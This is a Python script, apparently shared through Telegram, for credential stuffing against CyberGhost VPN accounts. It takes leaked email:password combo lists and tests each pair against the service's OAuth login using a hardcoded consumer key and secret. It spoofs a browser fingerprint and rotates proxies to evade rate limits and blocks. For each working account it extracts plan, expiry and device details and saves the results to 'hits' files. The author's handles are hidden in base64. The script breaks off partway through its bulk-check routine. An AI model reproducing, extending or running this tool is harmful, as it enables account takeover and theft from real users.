#!/usr/bin/env python3
import os
import sys
import json
import time
import random
import threading
import re
import base64
import hashlib
import configparser
import subprocess
import shutil
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from tqdm import tqdm

from curl_cffi import requests as cffi_requests

_B64_TOOL = "Q1lCRVJHSDg+IFZQTg=="
_B64_AUTH = "QGV5ZWxpZnRlcg=="
_B64_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_DIR  = "Q1lCRVJHSFNUX0BleWVsaWZ0ZXI="
_B64_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"


def _d(e):
    try:
        return base64.b64decode(e).decode('utf-8')
    except Exception as ex:
        raise SystemExit(f"Decode failed: {ex}")


TOOL_NAME = _d(_B64_TOOL)
TG_USERNAME = _d(_B64_AUTH)
TG_CHANNEL = _d(_B64_CHAN)
RESULTS_FOLDER = _d(_B64_DIR)
AUTHOR_TAG = _d(_B64_TAG)
CREDIT_SEAL = _d(_B64_SEAL)


def _v(ctx="x"):
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"

CONSUMER_KEY = "45d3fdd1635601b1c28a3d2f1d78d83e1c7edbb4"
CONSUMER_SECRET = "b97627f1c114d6b5eb567aa70b956001da3e5eea"
APP_VERSION = "8.4.7.14153"
OS_VERSION = "10.0.19045"
MACHINE_NAME = "SM-G965N"

COMMON_QS = {
    "flags": "0",
    "os": "win",
    "os_version": OS_VERSION,
    "app_version": APP_VERSION,
    "app_language": "en",
    "os_region": "us",
    "environment": "Live",
    "affiliate": "",
    "partners_id": "1",
}


def _open_url(url):
    try:
        if shutil.which('termux-open-url'):
            subprocess.Popen(['termux-open-url', url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        if shutil.which('xdg-open'):
            subprocess.Popen(['xdg-open', url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        if sys.platform == 'darwin':
            subprocess.Popen(['open', url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        if os.name == 'nt':
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def _c(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True),
    "INFO":    ("36", False),
    "WARN":    ("33", True),
    "ERROR":   ("31", True),
    "STEP":    ("96", True),
}


def L(emoji, level, tag, msg):
    _v("L")
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{_c('90', ts)} {emoji}  {_c(code, f'{level:7s}', bold)}  {_c('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def banner(title, sub=None, width=62):
    _v("b")
    print()
    hz = "═" if _ANSI else "-"
    vt = "║" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    print(_c("90", vt) + " " + _c("96", title.center(width-4), True) + " " + _c("90", vt))
    if sub:
        print(_c("90", vt) + " " + _c("2", sub.center(width-4)) + " " + _c("90", vt))
    print(_c("90", vt) + " " + _c("5", AUTHOR_TAG.center(width-4), True) + " " + _c("90", vt))
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))


def section(title, width=62):
    _v("s")
    hz = "─" if _ANSI else "-"
    inner = f" {title} "
    pad = width - len(inner) - 2
    if pad < 1:
        pad = 1
    print()
    print(_c("90", "┌" if _ANSI else "+") + _c("96", inner, True) + _c("90", hz * pad + ("┐" if _ANSI else "+")))


def divider(width=62):
    _v("d")
    hz = "─" if _ANSI else "-"
    print(_c("90", hz * width))


def summary_box(rows, width=62):
    _v("sb")
    hz = "─" if _ANSI else "-"
    vt = "│" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print()
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    for k, v in rows:
        line_plain = f"{k}: {v}"
        visible = len(line_plain)
        pad = max(1, width - 4 - visible)
        line_colored = f"{_c('96', k + ': ', True)}{_c('0', str(v))}"
        print(f"{_c('90', vt)} {line_colored}{' ' * pad}{_c('90', vt)}")
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))
    print()


_combo_clean = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


def extract_combos_from_text(content: str) -> set:
    _v("ec")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith('#'):
            continue
        m = _combo_clean.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split('|')[0].strip()
                if email and password and '@' in email:
                    combos.add(f"{email}:{password}")
    return combos


class ConfigLoader:
    def __init__(self, config_file="config_cyberghost.ini"):
        _v("cl")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.load_config()

    def load_config(self):
        _v("lc")
        if not os.path.exists(self.config_file):
            self.create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.parse_config()
        except Exception:
            self.create_default_config()
            self.parse_config()

    def create_default_config(self):
        _v("cdc")
        self.config["General"] = {
            "threads": "2",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "3",
            "retry_delay": "2",
            "combo_delay": "0.5",
            "debug": "false",
            "rate_limit_backoff": "8",
            "block_backoff": "5",
            "proxy_backoff": "1",
            "max_rate_limit_retries": "3",
            "cooldown_on_429": "30",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def parse_config(self):
        _v("pc")
        self.settings["threads"] = self.config.getint("General", "threads", fallback=2)
        self.settings["timeout"] = self.config.getint("General", "timeout", fallback=30)
        self.settings["proxies_file"] = self.config.get("General", "proxies_file", fallback="proxies.txt")
        self.settings["retries"] = self.config.getint("General", "retries", fallback=3)
        self.settings["retry_delay"] = self.config.getint("General", "retry_delay", fallback=2)
        self.settings["combo_delay"] = self.config.getfloat("General", "combo_delay", fallback=0.5)
        self.settings["debug"] = self.config.getboolean("General", "debug", fallback=False)
        self.settings["rate_limit_backoff"] = self.config.getint("General", "rate_limit_backoff", fallback=8)
        self.settings["block_backoff"] = self.config.getint("General", "block_backoff", fallback=5)
        self.settings["proxy_backoff"] = self.config.getint("General", "proxy_backoff", fallback=1)
        self.settings["max_rate_limit_retries"] = self.config.getint("General", "max_rate_limit_retries", fallback=3)
        self.settings["cooldown_on_429"] = self.config.getint("General", "cooldown_on_429", fallback=30)


CONFIG = ConfigLoader().settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
BLOCK_BACKOFF = CONFIG["block_backoff"]
PROXY_BACKOFF = CONFIG["proxy_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
GLOBAL_COOLDOWN_ON_429 = CONFIG["cooldown_on_429"]


def format_proxy(proxy):
    _v("fp")
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith("http"):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def test_proxy(proxy):
    _v("tp")
    try:
        session = cffi_requests.Session(impersonate="chrome")
        session.proxies = {"http": proxy, "https": proxy}
        r = session.get("https://api.cyberghostvpn.com/cg/health", timeout=12)
        return r.status_code == 200
    except Exception:
        return False


def load_proxies():
    _v("lp")
    proxies = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = format_proxy(line)
                    if p:
                        proxies.append(p)
    return proxies


def get_working_proxies(proxies, max_workers=None):
    _v("gwp")
    if not proxies:
        return []
    if max_workers is None:
        max_workers = min(20, len(proxies))
    L("🧪", "INFO", "PROXY", f"Testing {len(proxies)} proxies in parallel (up to {max_workers} threads)...")
    working = []
    total = len(proxies)
    pbar = tqdm(total=total, desc="Testing proxies", unit="proxy", ncols=80,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")

    def test_one(proxy):
        alive = test_proxy(proxy)
        return proxy, alive

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_one, p): p for p in proxies}
        for future in as_completed(futures):
            proxy, alive = future.result()
            if alive:
                working.append(proxy)
            pbar.update(1)
    pbar.close()
    L("✅", "INFO", "PROXY", f"{len(working)} working proxies found")
    return working if working else proxies


stop_event = threading.Event()
print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()
proxy_lock = threading.Lock()
cooldown_lock = threading.Lock()

stats = {
    "checked": 0,
    "hits": 0,
    "free": 0,
    "bad": 0,
    "errors": 0,
    "maxdev": 0,
    "rate_limited": 0,
    "blocks": 0,
    "proxy_fails": 0,
    "retries": 0,
}
START_TIME = time.time()
TOTAL_COMBOS = 0
PROXY_POOL = []
BAD_PROXIES = set()
HITS_FILE = None
MAXDEV_FILE = None
FREE_FILE = None
BAD_FILE = None
ERRORS_FILE = None
SESSION_FOLDER = None
GLOBAL_COOLDOWN_UNTIL = 0.0


def reset_stats():
    _v("rs")
    global stats, START_TIME, GLOBAL_COOLDOWN_UNTIL
    with stats_lock:
        stats = {
            "checked": 0,
            "hits": 0,
            "free": 0,
            "bad": 0,
            "errors": 0,
            "maxdev": 0,
            "rate_limited": 0,
            "blocks": 0,
            "proxy_fails": 0,
            "retries": 0,
        }
        START_TIME = time.time()
    GLOBAL_COOLDOWN_UNTIL = 0.0


def update_title():
    _v("ut")
    processed = stats["checked"]
    elapsed = time.time() - START_TIME
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    title = (f"{TOOL_NAME} | Hits: {stats['hits']} | Free: {stats['free']} | "
             f"MaxDev: {stats['maxdev']} | Checked: {processed}/{TOTAL_COMBOS} | CPM: {cpm}")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def _pick_proxy():
    with proxy_lock:
        available = [p for p in PROXY_POOL if p not in BAD_PROXIES]
        if not available and PROXY_POOL:
            BAD_PROXIES.clear()
            available = list(PROXY_POOL)
    return random.choice(available) if available else None


def _mark_bad_proxy(proxy):
    if not proxy:
        return
    with proxy_lock:
        BAD_PROXIES.add(proxy)
    with stats_lock:
        stats["proxy_fails"] += 1


def trigger_global_cooldown(seconds):
    global GLOBAL_COOLDOWN_UNTIL
    with cooldown_lock:
        until = time.time() + seconds
        if until > GLOBAL_COOLDOWN_UNTIL:
            GLOBAL_COOLDOWN_UNTIL = until
            L("🧊", "WARN", "COOLDOWN", f"rate limit — pausing all threads for {seconds}s")


def respect_global_cooldown():
    while True:
        with cooldown_lock:
            remaining = GLOBAL_COOLDOWN_UNTIL - time.time()
        if remaining <= 0:
            return
        time.sleep(min(remaining, 1.0))


class cyberghost:
    def __init__(self):
        _v("cg")
        self.session = cffi_requests.Session(impersonate="chrome")

    def _headers_oauth_access(self):
        return {
            'Authorization': (
                'OAuth realm="api.cyberghostvpn.com", '
                'oauth_version="1.0", '
                'oauth_timestamp="1719838888", '
                'oauth_signature_method="PLAINTEXT", '
                f'oauth_consumer_key="{CONSUMER_KEY}", '
                f'oauth_signature="{CONSUMER_SECRET}%26"'
            ),
            'Content-Type': 'application/json',
            'User-Agent': f'CG8Win ({APP_VERSION})',
            'Host': 'api.cyberghostvpn.com',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }

    def _access_token(self, email, password, proxy=None):
        machine_id = hashlib.md5(email.lower().encode()).hexdigest()

        body = {
            "x_auth_machineid": machine_id,
            "x_auth_machinename": MACHINE_NAME,
            "x_auth_password": password,
            "x_auth_username": email,
            "x_auth_mode": "client_auth",
        }

        url = "https://api.cyberghostvpn.com/cg/oauth/access_token"
        try:
            r = self.session.post(
                url,
                params=COMMON_QS,
                json=body,
                headers=self._headers_oauth_access(),
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=REQ_TIMEOUT,
                allow_redirects=False,
            )
        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ProxyError:
            return None, "proxy"
        except requests.exceptions.ConnectionError:
            return None, "proxy"
        except Exception as e:
            return None, str(e)[:80]

        text = r.text or ""

        if DEBUG:
            print(f"\n[access_token] status={r.status_code}  len={len(text)}")
            print(f"[access_token] server={r.headers.get('Server')}  cf-ray={r.headers.get('CF-RAY')}")
            print(f"[access_token] body: {text[:400]}")

        low = text.lower()
        if ("USER NOT FOUND OR WRONG PASSWORD" in text
                or "user not found" in low
                or "wrong password" in low):
            return {"bad": True, "message": "Wrong credentials"}, None

        if "MAXIMUM ACTIVATIONS REACHED" in text.upper():
            return {"maxdev": True, "raw": text}, None

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 503):
            return None, "block"
        if r.status_code == 500 and "1020" in low:
            return None, "block"
        if r.status_code in (502, 520, 521, 522, 523, 524):
            return None, "block"
        if r.status_code not in (200, 201):
            return None, f"http_{r.status_code}"

        m_tok = re.search(r'oauth_token=([^&\s"]+)', text)
        m_sec = re.search(r'oauth_token_secret=([^\s"&]+)', text)

        if not m_tok or not m_sec:
            return None, "parse"

        return {
            "bad": False,
            "token": m_tok.group(1),
            "secret": m_sec.group(1),
            "raw": text,
        }, None

    def _user_info(self, token, secret, proxy=None):
        url = "https://api.cyberghostvpn.com/cg/users/me"
        headers = {
            'Authorization': (
                'OAuth oauth_version="1.0", '
                'oauth_signature_method="PLAINTEXT", '
                f'oauth_consumer_key="{CONSUMER_KEY}", '
                f'oauth_signature="{CONSUMER_SECRET}%26{secret}", '
                f'oauth_token="{token}"'
            ),
            'Content-Type': 'application/json',
            'User-Agent': f'CG8Win ({APP_VERSION})',
            'Host': 'api.cyberghostvpn.com',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        try:
            r = self.session.get(
                url,
                params=COMMON_QS,
                headers=headers,
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=REQ_TIMEOUT,
                allow_redirects=False,
            )
        except Exception:
            return None

        if DEBUG:
            print(f"\n[users/me] status={r.status_code}  len={len(r.text)}")
            try:
                print(json.dumps(r.json(), indent=2, ensure_ascii=False)[:2500])
            except Exception:
                print(r.text[:600])

        if r.status_code == 429:
            return "__RATE_LIMITED__"
        if r.status_code == 403:
            return "__BLOCKED__"
        if r.status_code != 200:
            return None

        return r.text

    def _empty_user(self, email, maxdev=False):
        return {
            "email": email,
            "username": "",
            "plan": "",
            "plan_type": "",
            "plan_id": "",
            "expiry": "",
            "grace_until": "",
            "days_left": "",
            "months": "",
            "trial": False,
            "renew": False,
            "recurring": False,
            "max_devices": "",
            "free": False,
            "upgradable": False,
            "has_paid_trial": False,
            "country": "",
            "created": "",
            "was_premium": False,
            "is_free": False,
            "maxdev": maxdev,
            "raw_info": "",
        }

    def check(self, email, password, proxy=None):
        _v("chk")

        tok_result, err = self._access_token(email, password, proxy)
        if err:
            return {"status": "error", "error_type": err,
                    "message": f"token: {err}"}
        if tok_result.get("bad"):
            return {"status": "bad", "error_type": "creds",
                    "message": tok_result["message"]}
        if tok_result.get("maxdev"):
            return {"status": "valid", "error_type": None,
                    "message": "Max devices",
                    "user": self._empty_user(email, maxdev=True)}

        token = tok_result["token"]
        secret = tok_result["secret"]

        info_text = self._user_info(token, secret, proxy)

        if info_text == "__RATE_LIMITED__":
            return {"status": "error", "error_type": "rate_limit",
                    "message": "users/me rate limited"}
        if info_text == "__BLOCKED__":
            return {"status": "error", "error_type": "block",
                    "message": "users/me blocked"}

        user = self._empty_user(email)

        if info_text:
            user["raw_info"] = info_text[:4000]

            def grab(pat, default=""):
                m = re.search(pat, info_text)
                return m.group(1) if m else default

            user["username"] = grab(r'"user_name":"([^"]*)"')
            user["created"] = grab(r'"creationdate":"([^"]*)"')
            user["country"] = grab(r'"countrycode":"([^"]*)"')
            user["plan"] = grab(r'"internal_name":"([^"]*)"')
            user["plan_type"] = grab(r'"plan_type":"([^"]*)"')
            user["plan_id"] = grab(r'"plans_id":(\d+)')
            user["expiry"] = grab(r'"enddate":"([^"]*)"')
            user["grace_until"] = grab(r'"gracePeriodUntil":"([^"]*)"')
            user["days_left"] = grab(r'"days_left":(\d+)')
            user["months"] = grab(r'"months":(\d+)')
            user["max_devices"] = grab(r'"max_devices":(\d+)')

            user["trial"] = bool(re.search(r'"hasPaidTrial":true', info_text))
            user["has_paid_trial"] = user["trial"]
            user["renew"] = bool(re.search(r'"recurring":1', info_text))
            user["recurring"] = user["renew"]
            user["free"] = bool(re.search(r'"free":1', info_text))
            user["upgradable"] = bool(re.search(r'"upgradable":1', info_text))
            user["was_premium"] = bool(re.search(r'"waspremium":1', info_text))

            plan_type = user.get("plan_type", "").lower()
            plan_name = user.get("plan", "").lower()
            user["is_free"] = plan_type == "free" or "free plan" in plan_name

        if DEBUG:
            print("\n--- parsed ---")
            print(f"    plan: {user.get('plan')}")
            print(f"    plan_type: {user.get('plan_type')}")
            print(f"    days_left: {user.get('days_left')}")
            print(f"    trial: {user.get('trial')}")
            print(f"    renew: {user.get('renew')}")
            print(f"    max_devices: {user.get('max_devices')}")
            print(f"    is_free: {user.get('is_free')}")

        return {"status": "valid", "error_type": None,
                "message": "Login successful", "user": user}


def format_hit_line(email, password, u):
    def s(v):
        if v is None or v == "":
            return "-"
        return str(v)

    return (
        f"{email}:{password} | "
        f"Plan:{s(u.get('plan'))} | "
        f"Type:{s(u.get('plan_type'))} | "
        f"Days:{s(u.get('days_left'))} | "
        f"Trial:{str(u.get('trial', False)).lower()} | "
        f"Renew:{str(u.get('renew', False)).lower()} | "
        f"Devices:{s(u.get('max_devices'))} | "
        f"Country:{s(u.get('country'))} | "
        f"by {AUTHOR_TAG}"
    )


def process_combo(combo, proxy=None):
    _v("pc")
    global TOTAL_COMBOS, BAD_PROXIES, PROXY_POOL, HITS_FILE, MAXDEV_FILE, FREE_FILE

    if stop_event.is_set():
        return
    if ":" not in combo:
        return

    parts = combo.split(":", 1)
    if len(parts) != 2:
        return
    email, password = parts[0].strip(), parts[1].strip()
    if not email or not password or "@" not in email:
        return

    email = email.lower()

    checker = cyberghost()
    max_attempts = CONFIG.get("retries", 3) + 1
    rate_limit_hits = 0
    result = None

    for attempt in range(max_attempts):
        if stop_event.is_set():
            return

        respect_global_cooldown()

        if proxy and proxy in BAD_PROXIES:
            proxy = _pick_proxy()

        result = checker.check(email, password, proxy)
        status = result.get("status", "unknown")
        err_type = result.get("error_type", "")

        if status in ("valid", "bad"):
            break
        if err_type == "creds":
            break

        if err_type == "rate_limit":
            with stats_lock:
                stats["rate_limited"] += 1
                stats["retries"] += 1
            rate_limit_hits += 1
            trigger_global_cooldown(GLOBAL_COOLDOWN_ON_429)
            if rate_limit_hits > MAX_RATE_LIMIT_RETRIES:
                break
            backoff = RATE_LIMIT_BACKOFF * (2 ** (rate_limit_hits - 1))
            time.sleep(backoff)
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy()
            continue

        if err_type == "block":
            with stats_lock:
                stats["blocks"] += 1
                stats["retries"] += 1
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy()
            time.sleep(BLOCK_BACKOFF)
            continue

        if err_type == "proxy":
            with stats_lock:
                stats["retries"] += 1
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy()
            time.sleep(PROXY_BACKOFF)
            continue

        if err_type == "timeout":
            with stats_lock:
                stats["retries"] += 1
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy()
            time.sleep(CONFIG.get("retry_delay", 2))
            continue

        if err_type.startswith("http_"):
            with stats_lock:
                stats["retries"] += 1
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy()
            time.sleep(CONFIG.get("retry_delay", 2))
            continue

        time.sleep(CONFIG.get("retry_delay", 2))

    with stats_lock:
        stats["checked"] += 1
        checked = stats["checked"]
        total = TOTAL_COMBOS

        status = result.get("status", "unknown") if result else "error"
        if status == "valid":
            user = result.get('user', {}) or {}
            line = format_hit_line(email, password, user)

            if user.get("maxdev"):
                stats["maxdev"] += 1
                with print_lock:
                    print(f"[{checked}/{total}] 👥 MAXDEV {line}")
                if MAXDEV_FILE:
                    with file_lock:
                        MAXDEV_FILE.write(line + "\n")
                        MAXDEV_FILE.flush()
            elif user.get("is_free"):
                stats["free"] += 1
                with print_lock:
                    print(f"[{checked}/{total}] 🆓 FREE {line}")
                if FREE_FILE:
                    with file_lock:
                        FREE_FILE.write(line + "\n")
                        FREE_FILE.flush()
            else:
                stats["hits"] += 1
                with print_lock:
                    print(f"[{checked}/{total}] ✅ HIT {line}")
                if HITS_FILE:
                    with file_lock:
                        HITS_FILE.write(line + "\n")
                        HITS_FILE.flush()
        elif status == "bad":
            stats["bad"] += 1
            msg = result.get('message', 'Login failed') if result else 'no result'
            with print_lock:
                print(f"[{checked}/{total}] {email} - ❌ {status}: {msg}")
            if BAD_FILE:
                with file_lock:
                    BAD_FILE.write(f"{email}:{password} | {msg}\n")
                    BAD_FILE.flush()
        else:
            stats["errors"] += 1
            err_type = result.get("error_type", "") if result else ""
            msg = result.get('message', 'Unknown error') if result else 'no result'
            tag = f"[{err_type}]" if err_type else ""
            with print_lock:
                print(f"[{checked}/{total}] {email} - ⚠️ Error {tag}: {msg}")
            if ERRORS_FILE:
                with file_lock:
                    ERRORS_FILE.write(f"{email}:{password} | {err_type} | {msg}\n")
                    ERRORS_FILE.flush()

    combo_delay = CONFIG.get("combo_delay", 0.5)
    if combo_delay > 0:
        time.sleep(combo_delay)

    update_title()


def settings_menu():
    _v("sm")
    section("SETTINGS")
    print(_c("96", f"Current Settings:"))
    print(f"  Threads: {CONFIG['threads']} (1-20)")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Retry Delay: {CONFIG['retry_delay']}s")
    print(f"  Combo Delay: {CONFIG['combo_delay']}s")
    print(f"  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  Block Backoff: {CONFIG['block_backoff']}s")
    print(f"  Proxy Backoff: {CONFIG['proxy_backoff']}s")
    print(f"  Cooldown on 429: {CONFIG['cooldown_on_429']}s")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print(f"  Debug: {CONFIG['debug']}")
    print()
    print(_c("93", "[1] Change Threads (1-20)"))
    print(_c("93", "[2] Change Timeout"))
    print(_c("93", "[3] Change Retries"))
    print(_c("93", "[4] Change Retry Delay"))
    print(_c("93", "[5] Change Combo Delay"))
    print(_c("93", "[6] Toggle Debug"))
    print(_c("93", "[7] Back"))

    choice = input(f"{_c('96', '[*] Select: ')}").strip()
    if choice == "1":
        try:
            val = int(input("Threads (1-20): "))
            CONFIG["threads"] = max(1, min(20, val))
            L("✅", "INFO", "CONFIG", f"Threads set to {CONFIG['threads']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "2":
        try:
            val = int(input("Timeout (5-60): "))
            CONFIG["timeout"] = max(5, min(60, val))
            L("✅", "INFO", "CONFIG", f"Timeout set to {CONFIG['timeout']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "3":
        try:
            val = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, val))
            L("✅", "INFO", "CONFIG", f"Retries set to {CONFIG['retries']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "4":
        try:
            val = float(input("Retry delay (seconds): "))
            CONFIG["retry_delay"] = max(0, val)
            L("✅", "INFO", "CONFIG", f"Retry delay set to {CONFIG['retry_delay']}s")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "5":
        try:
            val = float(input("Combo delay (seconds): "))
            CONFIG["combo_delay"] = max(0, val)
            L("✅", "INFO", "CONFIG", f"Combo delay set to {CONFIG['combo_delay']}s")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "6":
        CONFIG["debug"] = not CONFIG["debug"]
        L("✅", "INFO", "CONFIG", f"Debug set to {CONFIG['debug']}")


def single_check_mode(proxies):
    _v("scm")
    section("SINGLE CHECK")
    combo = input(f"{_c('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        L("❌", "ERROR", "INPUT", "Invalid format. Use email:password")
        return

    proxy = _pick_proxy() if PROXY_POOL else (random.choice(proxies) if proxies else None)
    if proxy:
        L("🌐", "INFO", "PROXY", "Using proxy")

    L("🔍", "STEP", "CHECK", f"Checking {combo.split(':')[0]}...")
    start = time.time()
    email, password = combo.split(":", 1)
    checker = cyberghost()

    max_attempts = CONFIG.get("retries", 3) + 1
    rate_limit_hits = 0
    result = None
    for attempt in range(max_attempts):
        respect_global_cooldown()
        result = checker.check(email.strip(), password.strip(), proxy)
        status = result.get("status", "unknown")
        err_type = result.get("error_type", "")

        if status in ("valid", "bad") or err_type == "creds":
            break

        if err_type == "rate_limit":
            rate_limit_hits += 1
            trigger_global_cooldown(GLOBAL_COOLDOWN_ON_429)
            if rate_limit_hits > MAX_RATE_LIMIT_RETRIES:
                break
            backoff = RATE_LIMIT_BACKOFF * (2 ** (rate_limit_hits - 1))
            L("⏳", "WARN", "RATE-LIMIT", f"Backoff {backoff}s (attempt {attempt+1})")
            time.sleep(backoff)
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy() or (random.choice(proxies) if proxies else None)
            continue

        if err_type in ("block", "proxy", "timeout"):
            if proxy:
                _mark_bad_proxy(proxy)
                proxy = _pick_proxy() or (random.choice(proxies) if proxies else None)
            wait = (BLOCK_BACKOFF if err_type == "block"
                    else PROXY_BACKOFF if err_type == "proxy"
                    else CONFIG.get("retry_delay", 2))
            time.sleep(wait)
            continue

        time.sleep(CONFIG.get("retry_delay", 2))

    elapsed = time.time() - start

    if result and result.get("status") == "valid":
        u = result.get('user', {}) or {}
        if u.get('maxdev'):
            verdict = "MAXDEV"
        elif u.get('is_free'):
            verdict = "FREE"
        else:
            verdict = "SUBSCRIBER"

        rows = [
            ("Status", f"✅ VALID [{verdict}]"),
            ("Email", email.strip()),
            ("Password", password.strip()),
            ("Username", u.get('username', '-')),
            ("Country", u.get('country', '-')),
            ("Plan", u.get('plan', '-')),
            ("Plan Type", u.get('plan_type', '-')),
            ("Days Left", u.get('days_left', '-')),
            ("Months", u.get('months', '-')),
            ("Max Devices", u.get('max_devices', '-')),
            ("Trial", str(u.get('trial', False)).lower()),
            ("Renew", str(u.get('renew', False)).lower()),
            ("Free", str(u.get('free', False)).lower()),
            ("Was Premium", str(u.get('was_premium', False)).lower()),
            ("Created", u.get('created', '-')),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        print()
        summary_box(rows)
    else:
        status = result.get('status', 'Unknown') if result else 'no response'
        err_type = result.get('error_type', '') if result else ''
        msg = result.get('message', 'No details') if result else 'All retries exhausted'
        tag = f"[{err_type}]" if err_type else ""
        L("❌", "ERROR", "RESULT", f"{status} {tag} – {msg}")

    input(f"{_c('93', '[*] Press Enter to continue...')}")


def bulk_check_mode(proxies):
    _v("bcm")
    global TOTAL_COMBOS, PROXY_POOL, BAD_PROXIES
    global HITS_FILE, MAXDEV_FILE, FREE_FILE, BAD_FILE, ERRORS_FILE, SESSION_FOLDER
    reset_stats()
    section("BULK CHECK")
    filepath = input(f"{_c('96', '[*] Enter combo file path: ')}").strip()
    if not filepath or not os.path.isfile(filepath):
        L("❌", "ERROR", "FILE", "File not found")
        return

    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    combos_set = extract_combos_from_text(content)
    if not combos_set:
        L("❌", "ERROR", "EXTRACT", "No valid combos found in the file.")
        return

    combos = sorted(combos_set)
    L("✅", "INFO", "EXTRACT", f"Extracted {len(combos)} unique combos.")

    if not os.path.exists(RESULTS_FOLDER):
        os.makedirs(RESULTS_FOLDER)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    SESSION_FOLDER = os.path.join(RESULTS_FOLDER, f"Session_{timestamp}")
    os.makedirs(SESSION_FOLDER, exist_ok=True)

    hits_path = os.path.join(SESSION_FOLDER, "cyberghost_hits.txt")
    maxdev_path = os.path.join(SESSION_FOLDER, "cyberghost_maxdev.txt")
    free_path = os.path.join(SESSION_FOLDER, "cyberghost_free.txt")
    bad_path = os.path.join(SESSION_FOLDER, "cyberghost_bad.txt")
    err_path = os.path.join(SESSION_FOLDER, "cyberghost_errors.txt")

    HITS_FILE = open(hits_path, "w", encoding="utf-8")
    MAXDEV_FILE = open(maxdev_path, "w", encoding="utf-8")
    FREE_FILE = open(free_path, "w", encoding="utf-8")
    BAD_FILE = open(bad_path, "w", encoding="utf-8")
    ERRORS_FILE = open(err_path, "w", encoding="utf-8")

